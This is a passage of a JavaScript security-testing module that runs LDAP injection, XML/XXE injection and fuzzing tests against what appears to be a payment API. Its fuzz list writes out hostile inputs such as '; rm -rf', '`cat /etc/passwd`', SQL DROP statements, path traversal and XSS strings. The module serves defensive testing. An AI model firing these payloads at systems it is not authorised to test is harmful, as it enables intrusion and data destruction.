          response = await axios.get(`${this.baseUrl}${endpoint}`, {
            headers: {
              'X-ODEAL-REQUEST-KEY': ADVANCED_SECURITY_CONFIG.validAuthKey,
              'X-Ldap-Header': pattern
            },
            timeout: ADVANCED_SECURITY_CONFIG.requestTimeout,
            validateStatus: () => true
          });
        } else if (payloadLocation === 'body') {
          response = await axios.post(`${this.baseUrl}${endpoint}`, {
            username: pattern,
            filter: pattern
          }, {
            headers: { 'X-ODEAL-REQUEST-KEY': ADVANCED_SECURITY_CONFIG.validAuthKey },
            timeout: ADVANCED_SECURITY_CONFIG.requestTimeout,
            validateStatus: () => true
          });
        }

        const endTime = Date.now();
        const responseBody = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
        const ldapErrorIndicators = [
          'ldap error', 'ldap_bind', 'ldap_search', 'ldap_connect',
          'invalid credentials', 'invalid dn syntax', 'operations error',
          'protocol error', 'time limit exceeded', 'size limit exceeded',
          'compare false', 'compare true', 'auth method not supported',
          'strong auth required', 'referral', 'admin limit exceeded',
          'unavailable critical extension', 'confidentiality required',
          'sasl bind in progress', 'no such attribute', 'undefined attribute type',
          'inappropriate matching', 'constraint violation', 'attribute or value exists',
          'invalid attribute syntax', 'no such object', 'alias problem',
          'invalid dn syntax', 'is leaf', 'alias dereferencing problem',
          'inappropriate authentication', 'invalid credentials',
          'insufficient access rights', 'busy', 'unavailable',
          'unwilling to perform', 'loop detect', 'naming violation',
          'object class violation', 'not allowed on non leaf',
          'not allowed on rdn', 'entry already exists', 'object class mods prohibited',
          'affects multiple dsas', 'other'
        ];

        const containsLDAPError = ldapErrorIndicators.some(indicator =>
          responseBody.toLowerCase().includes(indicator)
        );

        const timingAttack = endTime - startTime > 5000; // 5 second threshold for LDAP timing attacks

        const result = {
          testType: 'LDAP Injection',
          payloadLocation,
          pattern,
          status: response.status,
          responseTime: endTime - startTime,
          containsLDAPError,
          timingAttack,
          responseBodyLength: responseBody.length,
          recommendation: containsLDAPError || timingAttack
            ? '⚠️ POTENTIAL LDAP INJECTION: LDAP error or timing attack detected'
            : '✅ LDAP injection attempt properly blocked'
        };

        ldapResults.push(result);

        if (containsLDAPError || timingAttack) {
          console.warn(`   LDAP Pattern: ${pattern.substring(0, 30)}... - ${result.recommendation}`);
        }

        // Small delay to avoid overwhelming the server
        await new Promise(resolve => setTimeout(resolve, 100));

      } catch (error) {
        const result = {
          testType: 'LDAP Injection',
          payloadLocation,
          pattern,
          status: 'NETWORK_ERROR',
          error: error.message,
          containsLDAPError: false,
          timingAttack: false,
          recommendation: '✅ Request blocked (network error)'
        };

        ldapResults.push(result);
      }
    }

    const overallResult = {
      testType: 'LDAP Injection Testing',
      endpoint,
      payloadLocation,
      totalPatterns: attackPatterns.length,
      errorPatterns: ldapResults.filter(r => r.containsLDAPError).length,
      timingPatterns: ldapResults.filter(r => r.timingAttack).length,
      vulnerablePatterns: ldapResults.filter(r => r.containsLDAPError || r.timingAttack).length,
      results: ldapResults,
      isVulnerable: ldapResults.some(r => r.containsLDAPError || r.timingAttack),
      recommendation: ldapResults.some(r => r.containsLDAPError || r.timingAttack)
        ? '⚠️ LDAP injection vulnerabilities detected'
        : '✅ No LDAP injection vulnerabilities detected'
    };

    this.results.push(overallResult);
    console.log(`📊 LDAP Injection Testing Results (${payloadLocation}):`);
    console.log(`   Total patterns: ${attackPatterns.length}`);
    console.log(`   Error patterns: ${overallResult.errorPatterns}`);
    console.log(`   Timing patterns: ${overallResult.timingPatterns}`);
    console.log(`   Vulnerable patterns: ${overallResult.vulnerablePatterns}`);
    console.log(`   ${overallResult.recommendation}`);

    return overallResult;
  }

  /**
   * Test XML Injection vulnerabilities
   */
  async testXMLInjection(endpoint = '/api/app2app/baskets/TEST_001', payloadLocation = 'body') {
    console.log(`📄 Testing XML injection on ${endpoint} in ${payloadLocation}...`);

    const xmlResults = [];
    const attackPatterns = ADVANCED_SECURITY_CONFIG.attackPatterns.xmlInjection;

    for (const pattern of attackPatterns) {
      try {
        const startTime = Date.now();
        let response;

        if (payloadLocation === 'body') {
          response = await axios.post(`${this.baseUrl}${endpoint}`, pattern, {
            headers: {
              'X-ODEAL-REQUEST-KEY': ADVANCED_SECURITY_CONFIG.validAuthKey,
              'Content-Type': 'application/xml'
            },
            timeout: ADVANCED_SECURITY_CONFIG.requestTimeout,
            validateStatus: () => true
          });
        } else if (payloadLocation === 'query') {
          response = await axios.get(`${this.baseUrl}${endpoint}?xml=${encodeURIComponent(pattern)}`, {
            headers: { 'X-ODEAL-REQUEST-KEY': ADVANCED_SECURITY_CONFIG.validAuthKey },
            timeout: ADVANCED_SECURITY_CONFIG.requestTimeout,
            validateStatus: () => true
          });
        } else if (payloadLocation === 'header') {
          response = await axios.get(`${this.baseUrl}${endpoint}`, {
            headers: {
              'X-ODEAL-REQUEST-KEY': ADVANCED_SECURITY_CONFIG.validAuthKey,
              'X-Xml-Header': pattern
            },
            timeout: ADVANCED_SECURITY_CONFIG.requestTimeout,
            validateStatus: () => true
          });
        }

        const endTime = Date.now();
        const responseBody = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
        const xmlErrorIndicators = [
          'xml error', 'xml parsing error', 'xml document', 'xml declaration',
          'doctype', 'entity', 'notation', 'element', 'attribute',
          'xml syntax error', 'xml parse error', 'xml validation error',
          'malformed xml', 'invalid xml', 'xml external entity',
          'xxe', 'xml bomb', 'entity expansion', 'billion laughs'
        ];

        const containsXMLError = xmlErrorIndicators.some(indicator =>
          responseBody.toLowerCase().includes(indicator)
        );

        const containsFileContent = responseBody.includes('root:') ||
                                  responseBody.includes('daemon:') ||
                                  responseBody.includes('bin:');

        const timingAttack = endTime - startTime > 10000; // 10 second threshold for XXE attacks

        const result = {
          testType: 'XML Injection',
          payloadLocation,
          pattern,
          status: response.status,
          responseTime: endTime - startTime,
          containsXMLError,
          containsFileContent,
          timingAttack,
          responseBodyLength: responseBody.length,
          recommendation: containsXMLError || containsFileContent || timingAttack
            ? '⚠️ POTENTIAL XML INJECTION: XML error or file access detected'
            : '✅ XML injection attempt properly blocked'
        };

        xmlResults.push(result);

        if (containsXMLError || containsFileContent || timingAttack) {
          console.warn(`   XML Pattern: ${pattern.substring(0, 50)}... - ${result.recommendation}`);
        }

        // Small delay to avoid overwhelming the server
        await new Promise(resolve => setTimeout(resolve, 200));

      } catch (error) {
        const result = {
          testType: 'XML Injection',
          payloadLocation,
          pattern,
          status: 'NETWORK_ERROR',
          error: error.message,
          containsXMLError: false,
          containsFileContent: false,
          timingAttack: false,
          recommendation: '✅ Request blocked (network error)'
        };

        xmlResults.push(result);
      }
    }

    const overallResult = {
      testType: 'XML Injection Testing',
      endpoint,
      payloadLocation,
      totalPatterns: attackPatterns.length,
      errorPatterns: xmlResults.filter(r => r.containsXMLError).length,
      filePatterns: xmlResults.filter(r => r.containsFileContent).length,
      timingPatterns: xmlResults.filter(r => r.timingAttack).length,
      vulnerablePatterns: xmlResults.filter(r => r.containsXMLError || r.containsFileContent || r.timingAttack).length,
      results: xmlResults,
      isVulnerable: xmlResults.some(r => r.containsXMLError || r.containsFileContent || r.timingAttack),
      recommendation: xmlResults.some(r => r.containsXMLError || r.containsFileContent || r.timingAttack)
        ? '⚠️ XML injection vulnerabilities detected'
        : '✅ No XML injection vulnerabilities detected'
    };

    this.results.push(overallResult);
    console.log(`📊 XML Injection Testing Results (${payloadLocation}):`);
    console.log(`   Total patterns: ${attackPatterns.length}`);
    console.log(`   Error patterns: ${overallResult.errorPatterns}`);
    console.log(`   File patterns: ${overallResult.filePatterns}`);
    console.log(`   Timing patterns: ${overallResult.timingPatterns}`);
    console.log(`   Vulnerable patterns: ${overallResult.vulnerablePatterns}`);
    console.log(`   ${overallResult.recommendation}`);

    return overallResult;
  }

  /**
   * Run all input validation tests
   */
  async runAllTests(endpoint = '/api/app2app/baskets/TEST_001') {
    console.log('🚀 Starting comprehensive input validation testing...');
    console.log(`🎯 Target endpoint: ${endpoint}`);
    console.log(`🌐 Base URL: ${this.baseUrl}`);
    console.log('');

    const results = {
      xss: [],
      sqlInjection: [],
      commandInjection: [],
      pathTraversal: [],
      ldapInjection: [],
      xmlInjection: [],
      summary: {},
      timestamp: new Date().toISOString(),
      endpoint,
      baseUrl: this.baseUrl
    };

    // Test XSS in different locations
    console.log('🕷️ Testing XSS vulnerabilities...');
    results.xss.push(await this.testXSSVulnerabilities(endpoint, 'header'));
    results.xss.push(await this.testXSSVulnerabilities(endpoint, 'query'));
    results.xss.push(await this.testXSSVulnerabilities(endpoint, 'body'));

    // Test SQL injection in different locations
    console.log('\n🗄️ Testing SQL injection vulnerabilities...');
    results.sqlInjection.push(await this.testSQLInjection(endpoint, 'query'));
    results.sqlInjection.push(await this.testSQLInjection(endpoint, 'header'));
    results.sqlInjection.push(await this.testSQLInjection(endpoint, 'body'));

    // Test command injection in different locations
    console.log('\n💻 Testing command injection vulnerabilities...');
    results.commandInjection.push(await this.testCommandInjection(endpoint, 'query'));
    results.commandInjection.push(await this.testCommandInjection(endpoint, 'header'));
    results.commandInjection.push(await this.testCommandInjection(endpoint, 'body'));

    // Test path traversal in different locations
    console.log('\n📁 Testing path traversal vulnerabilities...');
    results.pathTraversal.push(await this.testPathTraversal(endpoint, 'query'));
    results.pathTraversal.push(await this.testPathTraversal(endpoint, 'header'));
    results.pathTraversal.push(await this.testPathTraversal(endpoint, 'body'));

    // Test LDAP injection in different locations
    console.log('\n🔍 Testing LDAP injection vulnerabilities...');
    results.ldapInjection.push(await this.testLDAPInjection(endpoint, 'query'));
    results.ldapInjection.push(await this.testLDAPInjection(endpoint, 'header'));
    results.ldapInjection.push(await this.testLDAPInjection(endpoint, 'body'));

    // Test XML injection in different locations
    console.log('\n📄 Testing XML injection vulnerabilities...');
    results.xmlInjection.push(await this.testXMLInjection(endpoint, 'body'));
    results.xmlInjection.push(await this.testXMLInjection(endpoint, 'query'));

    // Generate summary
    results.summary = this.generateSummary(results);

    console.log('\n📊 Input Validation Testing Summary:');
    console.log(`   XSS Vulnerabilities: ${results.summary.xssVulnerabilities}`);
    console.log(`   SQL Injection: ${results.summary.sqlInjectionVulnerabilities}`);
    console.log(`   Command Injection: ${results.summary.commandInjectionVulnerabilities}`);
    console.log(`   Path Traversal: ${results.summary.pathTraversalVulnerabilities}`);
    console.log(`   LDAP Injection: ${results.summary.ldapInjectionVulnerabilities}`);
    console.log(`   XML Injection: ${results.summary.xmlInjectionVulnerabilities}`);
    console.log(`   Overall Security Score: ${results.summary.securityScore}/100`);
    console.log(`   ${results.summary.overallAssessment}`);

    return results;
  }

  /**
   * Generate summary from test results
   */
  generateSummary(results) {
    const xssVulnerabilities = results.xss.filter(r => r.isVulnerable).length;
    const sqlInjectionVulnerabilities = results.sqlInjection.filter(r => r.isVulnerable).length;
    const commandInjectionVulnerabilities = results.commandInjection.filter(r => r.isVulnerable).length;
    const pathTraversalVulnerabilities = results.pathTraversal.filter(r => r.isVulnerable).length;
    const ldapInjectionVulnerabilities = results.ldapInjection.filter(r => r.isVulnerable).length;
    const xmlInjectionVulnerabilities = results.xmlInjection.filter(r => r.isVulnerable).length;

    const totalTests = results.xss.length +
                     results.sqlInjection.length +
                     results.commandInjection.length +
                     results.pathTraversal.length +
                     results.ldapInjection.length +
                     results.xmlInjection.length;

    const vulnerabilitiesFound = xssVulnerabilities +
                                sqlInjectionVulnerabilities +
                                commandInjectionVulnerabilities +
                                pathTraversalVulnerabilities +
                                ldapInjectionVulnerabilities +
                                xmlInjectionVulnerabilities;

    const securityScore = Math.max(0, 100 - (vulnerabilitiesFound * 15));

    let overallAssessment = '';
    if (securityScore >= 90) {
      overallAssessment = '✅ EXCELLENT: Strong input validation';
    } else if (securityScore >= 70) {
      overallAssessment = '✅ GOOD: Generally secure input validation';
    } else if (securityScore >= 50) {
      overallAssessment = '⚠️ MODERATE: Some input validation concerns';
    } else {
      overallAssessment = '❌ POOR: Critical input validation vulnerabilities';
    }

    return {
      xssVulnerabilities,
      sqlInjectionVulnerabilities,
      commandInjectionVulnerabilities,
      pathTraversalVulnerabilities,
      ldapInjectionVulnerabilities,
      xmlInjectionVulnerabilities,
      totalTests,
      vulnerabilitiesFound,
      securityScore,
      overallAssessment
    };
  }

  getResults() {
    return this.results;
  }

  generateReport() {
    const vulnerabilities = this.results.filter(r => r.isVulnerable);
    const totalTests = this.results.length;

    return {
      totalTests,
      vulnerabilitiesFound: vulnerabilities.length,
      vulnerabilityRate: (vulnerabilities.length / totalTests) * 100,
      details: this.results,
      summary: vulnerabilities.length > 0
        ? `⚠️ ${vulnerabilities.length} input validation vulnerabilities detected`
        : '✅ No input validation vulnerabilities detected'
    };
  }
}

/**
 * Fuzzing Testing Utilities
 * Provides fuzzing capabilities for discovering edge cases and unexpected behaviors
 */
export class FuzzingTester {
  constructor(baseUrl = ADVANCED_SECURITY_CONFIG.baseUrl) {
    this.baseUrl = baseUrl;
    this.results = [];
  }

  /**
   * Generate fuzzing payloads
   */
  generateFuzzingPayloads() {
    const payloads = [];

    // Boundary values
    payloads.push('', ' ', 'a', 'aa', 'aaa', 'a'.repeat(255), 'a'.repeat(256), 'a'.repeat(1024), 'a'.repeat(4096));

    // Special characters
    payloads.push('!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '-', '_', '+', '=', '{', '}', '[', ']', '|', '\\', ':', ';', '"', "'", '<', '>', ',', '.', '?', '/', '~', '`');

    // Unicode characters
    payloads.push('é', 'ñ', 'ü', 'ö', 'ä', 'ß', 'æ', 'ø', 'å', 'π', 'Ω', 'α', 'β', 'γ', 'δ', 'ε', 'ζ', 'η', 'θ', 'λ', 'μ', 'ξ', 'π', 'ρ', 'σ', 'τ', 'υ', 'φ', 'χ', 'ψ', 'ω');

    // Control characters
    for (let i = 0; i < 32; i++) {
      payloads.push(String.fromCharCode(i));
    }

    // Numbers
    payloads.push('0', '1', '-1', '2147483647', '-2147483648', '3.14159', '1e10', '1e-10', 'NaN', 'Infinity', '-Infinity');

    // Boolean values
    payloads.push('true', 'false', 'TRUE', 'FALSE', 'True', 'False');

    // Null values
    payloads.push('null', 'NULL', 'undefined', 'void 0');

    // JSON values
    payloads.push('{}', '[]', '{"test": "value"}', '["test", "value"]', '{"nested": {"key": "value"}}', 'null');

    // SQL-like patterns
    payloads.push('SELECT * FROM users', 'DROP TABLE users', 'UPDATE users SET password="hacked"', 'INSERT INTO users VALUES ("hacker")');

    // Command injection patterns
    payloads.push('| ls', '; rm -rf', '&& whoami', '`cat /etc/passwd`', '$(echo hacked)');

    // Path traversal patterns
    payloads.push('../', '..\\', '/etc/passwd', 'C:\\Windows\\System32', '../../config', '..\\..\\config');

    // XSS patterns
    payloads.push('<script>alert(1)</script>', 'javascript:alert(1)', '<img src=x onerror=alert(1)>', '<svg onload=alert(1)>');

    // Format string patterns
    payloads.push('%s', '%d', '%f', '%x', '%n', '%p', '%08x', '%*d', '%.*d');

    // Encoding patterns
    payloads.push('%61%62%63', '&#97;&#98;&#99;', '&#x61;&#x62;&#x63;', '%u0061%u0062%u0063');

    // Regex patterns
    payloads.push('.*', '.*?', '.+', '.+?', '[a-z]', '[^a-z]', '^a$', 'a{0}', 'a{1000}', 'a{1,1000}', 'a{1000,}');

    // Time-based patterns
    payloads.push(Date.now().toString(), new Date().toISOString(), '1970-01-01T00:00:00Z', '9999-12-31T23:59:59Z');

    // Random strings
    for (let i = 0; i < 50; i++) {
      payloads.push(crypto.randomBytes(16).toString('hex'));
      payloads.push(crypto.randomBytes(16).toString('base64'));
    }

    return [...new Set(payloads)]; // Remove duplicates
  }

  /**
   * Fuzz an endpoint with generated payloads
   */
  async fuzzEndpoint(endpoint = '/api/app2app/baskets/TEST_001', payloadLocation = 'query', iterations = 100) {
    console.log(`🔀 Fuzzing endpoint ${endpoint} in ${payloadLocation} with ${iterations} iterations...`);

    const payloads = this.generateFuzzingPayloads();
    const fuzzResults = [];
    let crashCount = 0;
    let errorCount = 0;
    let unexpectedBehaviorCount = 0;

    for (let i = 0; i < Math.min(iterations, payloads.length); i++) {
      const payload = payloads[i];

      try {
        const startTime = Date.now();
        let response;

        if (payloadLocation === 'query') {
          response = await axios.get(`${this.baseUrl}${endpoint}?test=${encodeURIComponent(payload)}`, {
            headers: { 'X-ODEAL-REQUEST-KEY': ADVANCED_SECURITY_CONFIG.validAuthKey },
            timeout: ADVANCED_SECURITY_CONFIG.requestTimeout,
            validateStatus: () => true
          });
        } else if (payloadLocation === 'header') {
          response = await axios.get(`${this.baseUrl}${endpoint}`, {
            headers: {
              'X-ODEAL-REQUEST-KEY': ADVANCED_SECURITY_CONFIG.validAuthKey,
              'X-Fuzz-Header': payload
            },
            timeout: ADVANCED_SECURITY_CONFIG.requestTimeout,
            validateStatus: () => true
          });
        } else if (payloadLocation === 'body') {
          response = await axios.post(`${this.baseUrl}${endpoint}`, {
            fuzz: payload,
            data: payload
          }, {
            headers: { 'X-ODEAL-REQUEST-KEY': ADVANCED_SECURITY_CONFIG.validAuthKey },
            timeout: ADVANCED_SECURITY_CONFIG.requestTimeout,
            validateStatus: () => true
          });
        }

        const endTime = Date.now();
        const responseTime = endTime - startTime;

        // Check for unexpected behavior
        const isCrash = response.status >= 500;
        const isError = response.status >= 400 && response.status < 500;
        const isUnexpected = response.status > 200 && response.status < 300;

        if (isCrash) crashCount++;
        if (isError) errorCount++;
        if (isUnexpected) unexpectedBehaviorCount++;

        const result = {
          iteration: i + 1,
          payload,
          payloadLength: payload.length,
          status: response.status,
          responseTime,
          isCrash,
          isError,
          isUnexpected,
          recommendation: isCrash
            ? '💥 CRASH: Server error detected'
            : isError
            ? '⚠️ ERROR: Client error detected'
            : isUnexpected
            ? '❓ UNEXPECTED: Unexpected status code'
            : '✅ OK: Normal response'
        };

        fuzzResults.push(result);

        if (isCrash || isError || isUnexpected) {
          console.warn(`   Iteration ${i + 1}: ${result.recommendation} (Payload: ${payload.substring(0, 30)}...)`);
        }

        // Small delay to avoid overwhelming the server
        await new Promise(resolve => setTimeout(resolve, 50));

      } catch (error) {
        crashCount++;
        const result = {
          iteration: i + 1,
          payload,
          payloadLength: payload.length,
          status: 'NETWORK_ERROR',
          error: error.message,
          isCrash: true,
          isError: false,
          isUnexpected: false,
          recommendation: '💥 CRASH: Network error or server crash'
        };

        fuzzResults.push(result);
        console.warn(`   Iteration ${i + 1}: ${result.recommendation} (Payload: ${payload.substring(0, 30)}...)`);
      }
    }

    const overallResult = {
      testType: 'Fuzzing Testing',
      endpoint,
      payloadLocation,
      totalIterations: iterations,
      crashCount,
      errorCount,
      unexpectedBehaviorCount,
      crashRate: (crashCount / iterations * 100).toFixed(2),
      errorRate: (errorCount / iterations * 100).toFixed(2),
      unexpectedRate: (unexpectedBehaviorCount / iterations * 100).toFixed(2),
      results: fuzzResults,
      recommendation: crashCount > 0
        ? '💥 CRITICAL: Server crashes detected'
        : errorCount > iterations * 0.1
        ? '⚠️ WARNING: High error rate detected'
        : unexpectedBehaviorCount > iterations * 0.05
        ? '❓ INFO: Unexpected behavior detected'
        : '✅ GOOD: No crashes or excessive errors'
    };

    this.results.push(overallResult);
    console.log(`📊 Fuzzing Test Results (${payloadLocation}):`);
    console.log(`   Total iterations: ${iterations}`);
    console.log(`   Crashes: ${crashCount} (${overallResult.crashRate}%)`);
    console.log(`   Errors: ${errorCount} (${overallResult.errorRate}%)`);
    console.log(`   Unexpected behavior: ${unexpectedBehaviorCount} (${overallResult.unexpectedRate}%)`);
    console.log(`   ${overallResult.recommendation}`);

    return overallResult;
  }

  getResults() {
    return this.results;
  }

  generateReport() {
    const crashes = this.results.filter(r => r.crashCount > 0);
    const errors = this.results.filter(r => r.errorCount > r.totalIterations * 0.1);
    const unexpected = this.results.filter(r => r.unexpectedBehaviorCount > r.totalIterations * 0.05);

    return {
      totalTests: this.results.length,
      crashTests: crashes.length,
      errorTests: errors.length,
      unexpectedTests: unexpected.length,
      hasCrashes: crashes.length > 0,
      hasExcessiveErrors: errors.length > 0,
      hasUnexpectedBehavior: unexpected.length > 0,
      details: this.results,
      summary: crashes.length > 0
        ? '💥 CRITICAL: Server crashes detected during fuzzing'
        : errors.length > 0
        ? '⚠️ WARNING: Excessive errors detected during fuzzing'
        : unexpected.length > 0
        ? '❓ INFO: Unexpected behavior detected during fuzzing'
        : '✅ GOOD: No crashes or excessive errors during fuzzing'
    };
  }
}

// Export for use in test files
export {
  InputValidationTester,
  FuzzingTester,
  ADVANCED_SECURITY_CONFIG
};